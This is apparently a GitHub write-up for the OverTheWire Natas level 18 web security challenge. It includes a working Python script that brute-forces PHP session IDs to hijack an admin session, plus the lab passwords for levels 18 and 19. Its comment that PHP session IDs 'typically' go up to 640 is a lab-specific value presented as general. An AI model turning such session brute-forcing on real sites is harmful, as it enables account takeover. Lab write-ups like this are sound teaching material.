# Natas CTF Solutions  

## Natas Level 18  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit session-based authentication to find the password.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas18.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas18`  
- **Password:** Use the password from Natas Level 17:  
```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```  

![Home_Page](https://github.com/user-attachments/assets/005ad094-aec3-43fa-a202-a5507dbe344b)

---

### **Step 3: Analyze the Webpage**  
- When you try to log in with random credentials, it shows:  
```  
You are logged in as a regular user.  
```

![Web_Page](https://github.com/user-attachments/assets/ccd9ae59-d205-4fa9-8078-424a6665b9c4)

- Viewing the **page source** reveals that the page is handling **PHP session IDs**.

![Page_Source](https://github.com/user-attachments/assets/c7520534-1e9a-4d5a-8663-b15dcc43987e)
 
- The session ID is likely being validated on the server side to distinguish between regular and admin users.  

---

### **Step 4: Enable Debug Mode**  
Try adding `debug` in the URL to reveal additional info:  
```  
http://natas18.natas.labs.overthewire.org/index.php?debug  
```  
✅ This reveals that the session ID is being processed using PHP’s `$_SESSION` and a session-based authentication system.  

![Debug](https://github.com/user-attachments/assets/db52dab1-7e09-4fba-9e2b-9ff6b0e2e0f4)
![Session_ID](https://github.com/user-attachments/assets/5007e78a-7a50-4ca5-9ce6-269112e49deb)

---

### **Step 5: Automate Session ID Brute Force**  
Use this Python script to brute force the session ID:  

```python
import requests
from requests.auth import HTTPBasicAuth

# Authentication details
basicAuth = HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

MAX = 640  # PHP sessions typically have IDs up to 640
count = 1

u = "http://natas18.natas.labs.overthewire.org/index.php?debug"

# Start brute-forcing the PHPSESSID
while count <= MAX:
    sessionID = "PHPSESSID=" + str(count)
    headers = {'Cookie': sessionID}
    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(f"[+] Found session ID: {count}")
        print(response.text)
        break

    count += 1

print("Done!")
```

✅ **How the script works:**  
1. Attempts session IDs from `1` to `640` (common PHP session range).  
2. Sets the `PHPSESSID` using the `Cookie` header.  
3. If the response **does not** show `logged in as a regular user`, it confirms that the session is elevated to admin.  
4. Stops when an admin session is found.  

---

### **Step 6: Output**  
- After running the script, it finds a valid session ID — in this case, **119**.  
- Output example:  
```  
[+] Found session ID: 119
You are logged in as an admin.
```

![Password](https://github.com/user-attachments/assets/6025a0b9-7aff-4fe6-a34b-47a3609dffaa)

---

### **Step 7: Retrieve the Password**  
Once the session is authenticated as admin, the page reveals the password for **Natas Level 19**:  

---

### **✅ Password for Natas Level 19**  
```
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```  

---

## 💡 **Lessons Learned**  
✔️ **Session-based Authentication:** Session-based authentication can be vulnerable to brute force if IDs are predictable or short.  
✔️ **PHPSESSID Brute Force:** When PHP session IDs are handled insecurely, they can be guessed or brute-forced.  
✔️ **Automating Attacks:** Python scripts simplify the process of brute-forcing session IDs.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Page Source Code | ![Page_Source](https://github.com/user-attachments/assets/c7520534-1e9a-4d5a-8663-b15dcc43987e) |  
| Step 7 – Found Password | ![Password](https://github.com/user-attachments/assets/6025a0b9-7aff-4fe6-a34b-47a3609dffaa) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 19**:  
👉 [http://natas19.natas.labs.overthewire.org](http://natas19.natas.labs.overthewire.org)  

---
